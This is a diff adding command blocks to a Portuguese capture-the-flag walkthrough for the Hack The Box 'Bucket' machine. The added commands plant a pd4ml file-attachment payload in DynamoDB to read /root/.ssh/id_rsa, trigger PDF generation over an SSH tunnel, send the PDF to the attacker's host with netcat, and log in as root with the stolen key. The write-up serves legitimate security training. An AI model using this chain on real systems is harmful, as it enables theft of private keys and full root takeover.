@@ -142,32 +142,59 @@ Após uma analise do que estava rodando na máquina, podemos perceber que o arqu
 
 Então, vamos tentar fazer a criação dessa tabela manualmente.
 ![Image](https://i.imgur.com/894o4iV.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.bucket.htb
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
 
  Agora que a tabela foi criada vamos escrever nosso arquivo desejado.
 ![Image](https://i.imgur.com/SOPFNoe.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url=http://s3.bucket.htb
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
 
 Podemos validar se foi criado e escrito corretamente.
 ![Image](https://i.imgur.com/2UCnT06.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+aws dynamodb scan --table-name alerts --endpoint-url http://s3.bucket.htb/
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Precisamos fazer forward para conseguir enviar a requisição, então
 ![Image](https://i.imgur.com/ZAZDHJH.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ssh -L 8000:127.0.0.1:8000 roy@10.10.10.212
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Agora podemos fazer nossa requisição.
 
 ![Image](https://i.imgur.com/UshHUgt.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+curl -X POST -d "action=get_alerts" http://127.0.0.1:8000/ -v
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
 
 O arquivo agora foi criado na pasta /var/www/bucket-app/files/result.pdf
 ![Image](https://i.imgur.com/15FUBjs.png)
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc -vvn 10.10.14.218 443 < result.pdf
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Agora transferimos o arquivo PDF contendo o arquivo que inserimos na tabela para nossa máquina, utilizando o netcat.
 
 ![Image](https://i.imgur.com/kwRhhHi.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc -vnlp 443 > result.pdf
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Após baixarmos o arquivo para nossa máquina, podemos abri-lo como PDF, e lá está, nosso arquivo (id_rsa)
 ![Image](https://i.imgur.com/TU7OLGp.png)
 
 E então, salvamos o arquivo em nossa máquina com permissão 600 e assim podemos fazer o login como root!
 ![Image](https://i.imgur.com/wB66Uvu.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+chmod 600 id_rsa
+ssh root@bucket.htb -i id_rsa
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
 
